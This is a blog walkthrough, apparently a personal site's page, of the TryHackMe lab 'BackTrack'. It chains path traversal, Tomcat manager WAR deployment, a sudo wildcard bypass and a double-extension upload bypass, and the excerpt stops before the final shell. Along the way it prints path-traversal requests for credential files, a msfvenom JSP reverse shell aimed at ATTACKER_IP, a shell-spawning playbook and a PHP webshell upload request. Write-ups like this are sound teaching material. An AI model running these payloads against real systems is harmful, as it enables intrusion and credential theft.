@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>BackTrack — TryHackMe Writeup — Maks Huseynli</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,300&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:         #0b0f14;
+      --bg-2:       #0f1419;
+      --bg-3:       #141b22;
+      --bg-code:    #0d1117;
+      --border:     #1e2730;
+      --border-2:   #253040;
+      --text:       #c8d0da;
+      --text-dim:   #6b7a8d;
+      --text-faint: #3a4552;
+      --accent:     #4d9de0;
+      --accent-dim: #2d6fa8;
+      --green:      #34c759;
+      --yellow:     #ff9f0a;
+      --red:        #ff453a;
+      --mono: 'DM Mono', monospace;
+      --sans: 'DM Sans', sans-serif;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.75; -webkit-font-smoothing: antialiased; }
+
+    nav { position: fixed; top: 0; left: 0; right: 0; z-index: 100; background: rgba(11,15,20,0.88); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); }
+    .nav-inner { max-width: 1100px; margin: 0 auto; padding: 0 28px; height: 56px; display: flex; align-items: center; justify-content: space-between; }
+    .nav-brand { font-family: var(--mono); font-size: 13px; color: var(--accent); text-decoration: none; letter-spacing: 0.02em; }
+    .nav-links { display: flex; list-style: none; }
+    .nav-links a { font-size: 13px; color: var(--text-dim); text-decoration: none; padding: 6px 16px; border-radius: 4px; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--text); }
+    .nav-links a.active { color: var(--accent); }
+
+    .hero { padding: 96px 28px 56px; max-width: 1100px; margin: 0 auto; border-bottom: 1px solid var(--border); }
+    .hero-meta { display: flex; align-items: center; gap: 10px; margin-bottom: 28px; flex-wrap: wrap; }
+    .badge { font-family: var(--mono); font-size: 10px; padding: 3px 9px; border-radius: 3px; letter-spacing: 0.07em; text-transform: uppercase; }
+    .badge-p { background: rgba(52,199,89,0.08);  color: var(--green);  border: 1px solid rgba(52,199,89,0.2); }
+    .badge-c { background: rgba(77,157,224,0.08); color: var(--accent); border: 1px solid rgba(77,157,224,0.2); }
+    .badge-d { background: rgba(255,159,10,0.08); color: var(--yellow); border: 1px solid rgba(255,159,10,0.2); }
+    .badge-h { background: rgba(255,69,58,0.08);  color: var(--red);    border: 1px solid rgba(255,69,58,0.2); }
+    .hero h1 { font-size: clamp(28px, 5vw, 52px); font-weight: 300; line-height: 1.1; letter-spacing: -0.025em; color: #dce5ef; margin-bottom: 18px; }
+    .hero h1 strong { font-weight: 600; color: #edf2f7; }
+    .hero-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; max-width: 640px; line-height: 1.75; margin-bottom: 36px; border-left: 1px solid var(--border-2); padding-left: 20px; }
+    .hero-info { display: flex; gap: 40px; flex-wrap: wrap; }
+    .info-item { display: flex; flex-direction: column; gap: 4px; }
+    .info-label { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; }
+    .info-value { font-family: var(--mono); font-size: 12px; color: var(--text-dim); }
+    .info-value a { color: var(--accent); text-decoration: none; }
+
+    .body-wrap { display: grid; grid-template-columns: 1fr 196px; gap: 64px; max-width: 1100px; margin: 0 auto; padding: 64px 28px 120px; align-items: start; }
+
+    .toc { position: sticky; top: 76px; }
+    .toc-label { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 14px; }
+    .toc ul { list-style: none; display: flex; flex-direction: column; gap: 1px; }
+    .toc ul a { display: block; font-size: 11px; color: var(--text-dim); text-decoration: none; padding: 5px 8px; border-radius: 3px; border-left: 1px solid transparent; transition: color 0.15s, border-color 0.15s; }
+    .toc ul a:hover { color: var(--accent); border-left-color: var(--accent-dim); }
+
+    .section { margin-bottom: 64px; }
+    .s-num { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 6px; }
+    .section h2 { font-size: 19px; font-weight: 600; color: #dce5ef; letter-spacing: -0.018em; margin-bottom: 18px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+    .section h3 { font-size: 14px; font-weight: 500; color: #b0c0d0; letter-spacing: -0.01em; margin: 26px 0 10px; }
+    .section p { font-size: 14px; color: var(--text-dim); line-height: 1.8; margin-bottom: 12px; }
+    .section p strong { color: var(--text); font-weight: 500; }
+
+    pre { background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 16px 0; }
+    .ph { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .pl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .pd { display: flex; gap: 5px; }
+    .pd span { width: 8px; height: 8px; border-radius: 50%; display: block; }
+    pre code { display: block; padding: 18px; font-family: var(--mono); font-size: 12px; line-height: 1.72; color: #a0b8cc; overflow-x: auto; white-space: pre; }
+    .ck { color: #4a5a6a; font-style: italic; }
+    .ca { color: var(--accent); }
+    .cg { color: var(--green); }
+    .cr { color: var(--red); }
+    .cs { color: #ce9178; }
+    .cy { color: var(--yellow); }
+
+    .callout { padding: 14px 18px; border-radius: 5px; margin: 18px 0; border-left: 2px solid; font-size: 13px; line-height: 1.7; }
+    .blue   { background: rgba(77,157,224,0.05);  border-color: var(--accent); color: #88aacc; }
+    .yellow { background: rgba(255,159,10,0.05);  border-color: var(--yellow); color: #aa8855; }
+    .red    { background: rgba(255,69,58,0.05);   border-color: var(--red);    color: #aa6666; }
+    .green  { background: rgba(52,199,89,0.05);   border-color: var(--green);  color: #66aa77; }
+    .callout strong { color: inherit; font-weight: 600; }
+
+    .ports { display: flex; gap: 1px; background: var(--border); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 16px 0; }
+    .port { flex: 1; background: var(--bg-2); padding: 18px 14px; text-align: center; }
+    .port-num { font-family: var(--mono); font-size: 17px; color: var(--accent); font-weight: 500; }
+    .port-svc { font-family: var(--mono); font-size: 11px; color: var(--text-dim); margin-top: 4px; }
+    .port-note { font-size: 10px; color: var(--text-faint); margin-top: 3px; }
+
+    .shot { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .sh { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .sl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .ss { font-family: var(--mono); font-size: 10px; color: var(--accent); }
+    .shot img { display: block; width: 100%; height: auto; background: var(--bg-3); }
+    .sc { padding: 9px 14px; font-size: 11px; color: var(--text-faint); font-style: italic; border-top: 1px solid var(--border); background: var(--bg-2); }
+
+    .steps { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .step { display: grid; grid-template-columns: 52px 1fr; border-bottom: 1px solid var(--border); }
+    .step:last-child { border-bottom: none; }
+    .sn { display: flex; align-items: center; justify-content: center; background: var(--bg-2); border-right: 1px solid var(--border); font-family: var(--mono); font-size: 10px; color: var(--text-faint); padding: 14px 0; }
+    .sb { padding: 14px 18px; font-size: 13px; color: var(--text-dim); background: var(--bg); line-height: 1.7; }
+    .sb strong { color: var(--text); font-weight: 500; }
+
+    .chain { background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px; padding: 24px 28px; margin: 18px 0; }
+    .chain-row { display: flex; align-items: flex-start; gap: 14px; margin-bottom: 10px; }
+    .chain-row:last-child { margin-bottom: 0; }
+    .chain-arrow { font-family: var(--mono); font-size: 11px; color: var(--text-faint); padding-top: 2px; flex-shrink: 0; }
+    .chain-bug { font-family: var(--mono); font-size: 12px; color: var(--accent); flex-shrink: 0; min-width: 220px; }
+    .chain-gives { font-size: 12px; color: var(--text-dim); }
+
+    footer { border-top: 1px solid var(--border); padding: 28px; }
+    .footer-inner { max-width: 1100px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
+    .footer-copy { font-family: var(--mono); font-size: 11px; color: var(--text-faint); }
+    .footer-links { display: flex; gap: 24px; }
+    .footer-links a { font-family: var(--mono); font-size: 11px; color: var(--text-faint); text-decoration: none; transition: color 0.2s; }
+    .footer-links a:hover { color: var(--text-dim); }
+
+    @media (max-width: 860px) { .body-wrap { grid-template-columns: 1fr; } .toc { display: none; } }
+    @media (max-width: 580px) { .hero, .body-wrap { padding-left: 20px; padding-right: 20px; } .ports { flex-direction: column; } .footer-inner { flex-direction: column; gap: 12px; } }
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a class="nav-brand" href="../index.html">CyberMaks</a>
+    <ul class="nav-links">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../methodology.html">Methodology</a></li>
+      <li><a href="../about.html">About</a></li>
+      <li><a href="../index.html#writeups" class="active">Writeups</a></li>
+    </ul>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="hero-meta">
+    <span class="badge badge-p">TryHackMe</span>
+    <span class="badge badge-c">Web</span>
+    <span class="badge badge-c">Linux</span>
+    <span class="badge badge-c">Privesc</span>
+    <span class="badge badge-h">Hard</span>
+  </div>
+  <h1><strong>BackTrack</strong></h1>
+  <p class="hero-desc">
+    Three privesc steps stacked on a Tomcat path-traversal foothold: a sudo-wildcard fnmatch bypass for <code>tomcat→wilbur</code>, an upload filter + path-traversal double-bypass for <code>wilbur→orville</code>, and a TTY pushback via <code>TIOCSTI</code> ioctl for <code>orville→root</code>. Four completely different bug classes in one box, and each one only reachable because the previous one gave up the exact piece of information the next one needed.
+  </p>
+  <div class="hero-info">
+    <div class="info-item"><span class="info-label">Platform</span><span class="info-value">TryHackMe</span></div>
+    <div class="info-item"><span class="info-label">Difficulty</span><span class="info-value">Hard</span></div>
+    <div class="info-item"><span class="info-label">Category</span><span class="info-value">Web / Linux / Privesc</span></div>
+    <div class="info-item"><span class="info-label">Chain</span><span class="info-value">tomcat → wilbur → orville → root</span></div>
+  </div>
+</header>
+
+<div class="body-wrap">
+<main>
+
+  <!-- ── 01 ENUMERATION ── -->
+  <section class="section" id="recon">
+    <div class="s-num">01</div>
+    <h2>Network Reconnaissance</h2>
+    <p>Full TCP SYN scan with service and version detection across all ports.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+sudo nmap -sS -sV -sC 10.48.191.68 -p- -T4</code></pre>
+    <div class="ports">
+      <div class="port"><div class="port-num">22</div><div class="port-svc">SSH</div><div class="port-note">OpenSSH 8.2p1</div></div>
+      <div class="port"><div class="port-num">6800</div><div class="port-svc">aria2 RPC</div><div class="port-note">JSON-RPC downloader</div></div>
+      <div class="port"><div class="port-num">8080</div><div class="port-svc">Tomcat</div><div class="port-note">Apache Tomcat 8.5.93</div></div>
+      <div class="port"><div class="port-num">8888</div><div class="port-svc">???</div><div class="port-note">unidentified web app</div></div>
+    </div>
+    <p>Four surfaces. Tomcat on 8080 has <code>/manager/html</code> and <code>/host-manager/html</code> returning <code>401</code> — basic auth, no creds yet. The manager is the obvious prize but it needs credentials first. Port 8888 is some unrecognised web app; that goes under the microscope next.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+dirsearch -u http://10.48.191.68:8080
+<span class="ck"># → /manager/html 401, /host-manager/html 401, standard Tomcat layout</span>
+
+whatweb http://10.48.191.68:8888
+<span class="ck"># → HTML5, PasswordField, AngularJS templates, Title[times]</span>
+
+dirsearch -u http://10.48.191.68:8888</code></pre>
+    <p>The dirsearch hit on 8888 that immediately stands out:</p>
+    <pre><code><div class="ph"><span class="pl">dirsearch output</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cg">[200] /../../../../../../etc/passwd</span>
+[200] /app.js
+[200] /index.html</code></pre>
+    <div class="callout red"><strong>Signal:</strong> A <code>200</code> on a traversal path means the server is passing <code>../</code> sequences directly to the filesystem — classic path traversal. This isn't subtle.</div>
+  </section>
+
+  <!-- ── 02 PATH TRAVERSAL ── -->
+  <section class="section" id="traversal">
+    <div class="s-num">02</div>
+    <h2>Path Traversal on 8888 → Information Disclosure</h2>
+    <p>The app on 8888 is a known-vulnerable Node/static server that doesn't sanitise <code>../</code> in the URL path. There's a public PoC for this class of bug. The key detail when exploiting it with <code>curl</code> is the <code>--path-as-is</code> flag — without it, <code>curl</code> normalises the traversal sequences client-side before they ever leave your machine, and the traversal never reaches the server.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl --path-as-is \
+  'http://backtrack.thm:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd'</code></pre>
+    <p>Relevant accounts at the bottom of the output:</p>
+    <pre><code><div class="ph"><span class="pl">output — /etc/passwd</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cg">tomcat:x:1002:1002::/opt/tomcat:/bin/false</span>
+<span class="cg">orville:x:1003:1003::/home/orville:/bin/bash</span>
+<span class="cg">wilbur:x:1004:1004::/home/wilbur:/bin/bash</span></code></pre>
+    <p>Three real users, and — more importantly — the home directory of Tomcat is <code>/opt/tomcat</code>. That's the pivot. Since the traversal gives arbitrary file read, the next logical target is Tomcat's credential store.</p>
+    <pre><code><div class="ph"><span class="pl">shell — read catalina.out to confirm paths</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl --path-as-is \
+  'http://backtrack.thm:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/logs/catalina.out'
+<span class="ck"># Confirms: CATALINA_BASE=/opt/tomcat, Ubuntu 20.04, kernel 5.4.0-173</span>
+<span class="ck"># Keep that kernel version in mind — it matters for the root step</span></code></pre>
+    <p>Now the money shot. Tomcat stores manager credentials in <code>conf/tomcat-users.xml</code> in plaintext:</p>
+    <pre><code><div class="ph"><span class="pl">shell — read tomcat-users.xml</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl --path-as-is \
+  'http://backtrack.thm:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml'</code></pre>
+    <pre><code><div class="ph"><span class="pl">output — tomcat-users.xml</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+username=<span class="cs">"tomcat"</span> password=<span class="cs">"OPx52k53D8..."</span> roles=<span class="cs">"manager-gui,manager-script,..."</span></code></pre>
+    <div class="callout blue"><strong>Why it worked:</strong> The path traversal on 8888 and the Tomcat manager on 8080 are completely separate services — but they share the same filesystem. Arbitrary read on one service hands you auth for a different service entirely. Classic multi-app box logic, and a reminder that filesystem-level information disclosure has a blast radius that extends way beyond the vulnerable service itself.</div>
+    <p><strong>Portable lesson:</strong> <code>--path-as-is</code> in <code>curl</code> is not an obscure flag — it's essential for any path traversal test. Without it your client silently cleans the payload and you'll think the server is patched when it isn't.</p>
+  </section>
+
+  <!-- ── 03 FOOTHOLD ── -->
+  <section class="section" id="foothold">
+    <div class="s-num">03</div>
+    <h2>Tomcat Manager → WAR Deploy → Shell as <code>tomcat</code></h2>
+    <h3>The GUI rejection</h3>
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">manager GUI — login dialog</span></div>
+      <img src="backtrack-tomcatlogin.png" alt="Tomcat manager login dialog at backtrack.thm:8080" loading="lazy" />
+      <div class="sc">The browser prompts basic auth for /manager/html. These same credentials will be refused by the GUI.</div>
+    </div>
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">403 Access Denied — /manager/html</span></div>
+      <img src="backtrack-tomcatdenied.png" alt="403 Access Denied from Tomcat manager HTML endpoint" loading="lazy" />
+      <div class="sc">403 from the HTML manager even with the correct credentials. The GUI and text API are gated differently.</div>
+    </div>
+    <p>Here's the thing that bit me: the web GUI at <code>/manager/html</code> returned <strong>403 Access Denied</strong> even with valid credentials. I burned time here thinking the password was wrong. Turns out the HTML manager is often restricted to <code>localhost</code> in Tomcat's valve configuration (<code>RemoteAddrValve</code>), while the <strong>text API</strong> endpoint has different — sometimes weaker — access controls. The fix: always test <code>/manager/text/</code> directly with <code>curl -u</code> before assuming creds are bad.</p>
+    <pre><code><div class="ph"><span class="pl">shell — test the text API directly</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl -u 'tomcat:OPx52k53D8...' http://backtrack.thm:8080/manager/text/list
+<span class="cg"># OK — Returns deployed application list</span></code></pre>
+    <p>Text API works. The manager lets you deploy arbitrary WAR files, Tomcat runs Java, so the payload is a JSP reverse shell packaged as a WAR.</p>
+    <pre><code><div class="ph"><span class="pl">shell — build and deploy the WAR</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+msfvenom -p java/jsp_shell_reverse_tcp \
+         LHOST=<span class="ca">ATTACKER_IP</span> LPORT=4445 \
+         -f war -o shell.war
+
+nc -lvnp 4445 <span class="ck">&amp;  # listener first</span>
+
+curl -u 'tomcat:OPx52k53D8...' \
+     --upload-file shell.war \
+     'http://backtrack.thm:8080/manager/text/deploy?path=/shell&update=true'
+<span class="cg"># OK - Deployed application at context path [/shell]</span>
+
+curl http://backtrack.thm:8080/shell/
+<span class="ck"># triggers the servlet → shell lands on listener</span></code></pre>
+    <p>Shell as <code>tomcat</code>. Stabilise the TTY — this matters for the ansible step later:</p>
+    <pre><code><div class="ph"><span class="pl">shell — TTY stabilisation</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+<span class="ck"># Ctrl+Z to background</span>
+stty raw -echo; fg
+export TERM=xterm</code></pre>
+  </section>
+
+  <!-- ── 04 PRIVESC 1 ── -->
+  <section class="section" id="privesc1">
+    <div class="s-num">04</div>
+    <h2>Privesc 1: <code>tomcat → wilbur</code> — ansible-playbook Sudo Wildcard</h2>
+    <h3>Recon</h3>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+sudo -l</code></pre>
+    <pre><code><div class="ph"><span class="pl">output</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+(wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/<span class="ca">*</span>.yml</code></pre>
+    <p><code>tomcat</code> can invoke <code>ansible-playbook</code> as <code>wilbur</code> without a password, on any <code>*.yml</code> inside <code>/opt/test_playbooks/</code>. The two playbooks that exist there (<code>failed_login.yml</code>, <code>suspicious_ports.yml</code>) are benign monitoring tasks. The bug isn't in their contents — it's in the sudo rule itself.</p>
+    <h3>The vector</h3>
+    <p><code>ansible-playbook</code> executes arbitrary tasks. A <code>shell:</code> task is direct command execution. Any interpreter or runner that shows up in <code>sudo -l</code> is a GTFOBins candidate — <code>ansible-playbook</code> is no different.</p>
+    <h3>The obstacle</h3>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ls -ld /opt/test_playbooks
+<span class="ck"># drwxr-xr-x 2 wilbur wilbur ... /opt/test_playbooks</span></code></pre>
+    <p>The directory is owned by <code>wilbur</code>. <code>tomcat</code> can't write there, so dropping a malicious playbook directly is off the table.</p>
+    <h3>The bypass — fnmatch without FNM_PATHNAME</h3>
+    <p>Sudo matches the wildcard using <code>fnmatch(3)</code> <strong>without</strong> the <code>FNM_PATHNAME</code> flag. That flag is what makes <code>*</code> refuse to match a literal <code>/</code>. Without it, <code>*</code> matches anything, including directory separators. So the path:</p>
+    <pre><code><div class="ph"><span class="pl">traversal argument</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+/opt/test_playbooks/../../tmp/pwn.yml</code></pre>
+    <p>satisfies the rule pattern perfectly — the literal prefix <code>/opt/test_playbooks/</code> matches, <code>*</code> eats <code>../../tmp/pwn</code> (including the slashes), and <code>.yml</code> closes it. Sudo accepts the argument; the kernel then resolves the <code>../</code> at file-open time and reads <code>/tmp/pwn.yml</code>. The "trusted directory" check means nothing.</p>
+    <h3>Exploitation</h3>
+    <pre><code><div class="ph"><span class="pl">shell — write the payload playbook to /tmp</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+printf -- '---\n- hosts: localhost\n  connection: local\n  gather_facts: no\n  tasks:\n    - shell: /bin/bash &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty\n' \
+  > /tmp/pwn.yml</code></pre>
+    <p>First run failed immediately with <strong>Errno 13 (Permission denied)</strong>. My umask created the file as <code>600</code> — readable only by <code>tomcat</code>, which is fine for us but the process that actually opens and reads the playbook runs as <code>wilbur</code>. Fix:</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+chmod 644 /tmp/pwn.yml
+
+sudo -u wilbur /usr/bin/ansible-playbook \
+  /opt/test_playbooks/../../tmp/pwn.yml</code></pre>
+    <p>The <code>&lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty</code> in the shell task redirects the spawned bash directly to the current terminal. Interactive shell as <code>wilbur</code>.</p>
+    <div class="callout red"><strong>Root cause / fix:</strong> The rule tried to say "only playbooks from this specific directory." Wildcards in sudo paths destroy that guarantee because fnmatch's default matching is directory-blind. Correct approach: enumerate specific filenames with no wildcard at all, or add a wrapper script that canonicalises the path with <code>realpath</code> and validates the prefix before invoking ansible.</div>
+    <p><strong>Portable lesson:</strong> Wildcards in <code>sudo</code> path arguments are almost always bypassable with <code>../</code>. Any <code>sudo -l</code> entry with a <code>*</code> in the path gets this treatment immediately.</p>
+  </section>
+
+  <!-- ── 05 LOOT WILBUR ── -->
+  <section class="section" id="loot">
+    <div class="s-num">05</div>
+    <h2>Looting wilbur's Home</h2>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ls -la ~</code></pre>
+    <pre><code><div class="ph"><span class="pl">output</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+-rw------- 1 wilbur wilbur .just_in_case.txt
+-rw------- 1 wilbur wilbur from_orville.txt</code></pre>
+    <p><code>.just_in_case.txt</code> is wilbur's own password — useful for a stable SSH session instead of the ansible shell:</p>
+    <pre><code><div class="ph"><span class="pl">output — .just_in_case.txt</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+wilbur : mYe3...</code></pre>
+    <p><code>from_orville.txt</code> is a note handing over credentials to a locally-hosted image gallery, and explicitly mentioning that registration is disabled:</p>
+    <pre><code><div class="ph"><span class="pl">output — from_orville.txt</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+email    : orville@backtrack.thm
+password : W34r...</code></pre>
+    <p>Check what's listening locally:</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ss -tuln</code></pre>
+    <pre><code><div class="ph"><span class="pl">output</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="cg">127.0.0.1:80    LISTEN</span>   <span class="ck">← the gallery, loopback only</span>
+127.0.0.1:3306  LISTEN   <span class="ck">← MySQL</span></code></pre>
+    <p>Port 80 is bound exclusively to loopback — that's why nmap never saw it. It's the next target, and you can't reach it directly from outside. Time to tunnel.</p>
+  </section>
+
+  <!-- ── 06 TUNNEL ── -->
+  <section class="section" id="tunnel">
+    <div class="s-num">06</div>
+    <h2>SSH Tunnel → Internal Gallery</h2>
+    <p>Forward the target's loopback port 80 to your local port 9999 over SSH, authenticating as <code>wilbur</code> with the password from the note:</p>
+    <pre><code><div class="ph"><span class="pl">attacker shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ssh -L 9999:127.0.0.1:80 wilbur@backtrack.thm
+
+<span class="ck"># verify in another terminal</span>
+ss -tlnp | grep 9999   <span class="ck"># → 127.0.0.1:9999 LISTEN</span>
+curl http://127.0.0.1:9999/   <span class="ck"># → Orville's Gallery HTML</span></code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">browser — via ssh tunnel</span><span class="ss">127.0.0.1:9999/login.php</span></div>
+      <img src="backtrack.png" alt="Orville's Gallery login page accessed via SSH tunnel at 127.0.0.1:9999" loading="lazy" />
+      <div class="sc">Gallery login page visible through the tunnel. Registration is disabled — those credentials from from_orville.txt are the only way in.</div>
+    </div>
+    <p>Log in with orville's credentials from the note. Registration being explicitly disabled is the reason those credentials mattered — there's no self-signup path.</p>
+    <div class="callout blue"><strong>Burp note:</strong> The SSH tunnel and Burp are two separate links. To intercept tunnel traffic in Burp you either proxy curl explicitly (<code>curl -x http://127.0.0.1:8080 ...</code>), configure the browser's localhost bypass (<code>network.proxy.allow_hijacking_localhost = true</code> in Firefox <code>about:config</code>), or just use Burp's built-in browser which has no localhost-bypass problem.</div>
+  </section>
+
+  <!-- ── 07 PRIVESC 2 ── -->
+  <section class="section" id="privesc2">
+    <div class="s-num">07</div>
+    <h2>Privesc 2: <code>wilbur → orville</code> — Upload Filter Bypass + Path Traversal</h2>
+    <h3>Recon</h3>
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">gallery dashboard — upload form</span></div>
+      <img src="backtrack2.png" alt="Gallery dashboard at 127.0.0.1:9999/dashboard.php with upload form and devtools storage panel open" loading="lazy" />
+      <div class="sc">Dashboard with file upload claiming to accept only images. DevTools shows the session cookies — note the PHPSESSID needed for the Burp request.</div>
+    </div>
+    <p>The dashboard has an image upload that filters on extension. The gallery HTML itself gives away the intended bypass — uploaded files get referenced as <code>uploads/shell.png.php</code>, meaning the app stores the filename <em>verbatim</em> and Apache still executes anything whose last extension is <code>.php</code>.</p>
+    <p>Two things have to line up simultaneously:</p>
+    <p><strong>1. Double extension <code>.png.php</code></strong> — passes any "must look like an image" suffix check (last explicit check sees <code>.png</code>), while Apache's MIME handler still treats it as PHP because the real last extension is <code>.php</code>.</p>
+    <p><strong>2. Path traversal in the filename field</strong> — the <code>uploads/</code> directory has PHP execution disabled (files there are served as plaintext, not executed). The payload has to land one level up in the web root, where PHP runs fine. That means <code>../shell.png.php</code> as the filename — a raw <code>../</code> in the multipart <code>filename</code> parameter.</p>
+    <h3>The POST — built in Burp Repeater</h3>
+    <pre><code><div class="ph"><span class="pl">http — burp repeater</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+POST /dashboard.php HTTP/1.1
+Host: 127.0.0.1:9999
+Cookie: PHPSESSID=...; _xsrf=...; username=...
+Content-Type: multipart/form-data; boundary=----wb
+Connection: close
+
+------wb
+Content-Disposition: form-data; name=<span class="cs">"image"</span>; filename=<span class="cs">"../shell.png.php"</span>
+Content-Type: image/png
+
+&lt;?php system($_GET[<span class="cs">'cmd'</span>]); ?&gt;
+------wb--</code></pre>
+    <p>Details that bit me during this step: the blank line between the part headers and the PHP payload is mandatory in multipart bodies — skip it and the server won't recognise the data. <code>Content-Length</code> must be exact — let Burp update it. And critically: a single raw <code>../</code> worked where double-URL-encoding (<code>%252e%252e%252f</code>) sent the file to the wrong place. The traversal copy is visible in the gallery as <code>uploads/../shell.png.php</code>, which confirms it landed in the web root.</p>
+    <h3>Verifying the bypass</h3>
+    <pre><code><div class="ph"><span class="pl">shell — confirm which path executes</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl 'http://127.0.0.1:9999/uploads/shell.png.php?cmd=id'
+<span class="cr"># → returns raw PHP source — uploads/ is PHP-disabled</span>
+
+curl 'http://127.0.0.1:9999/shell.png.php?cmd=whoami'
+<span class="cg"># → orville   ✓ RCE confirmed at web root</span></code></pre>
+    <h3>Reverse shell</h3>
+    <p>Base64-wrap the payload so special characters don't get mangled by URL encoding, then deliver it. Use your THM <code>tun0</code> address — not a LAN <code>192.168.x</code> IP. The target lives inside the THM network and can only route back through the VPN.</p>
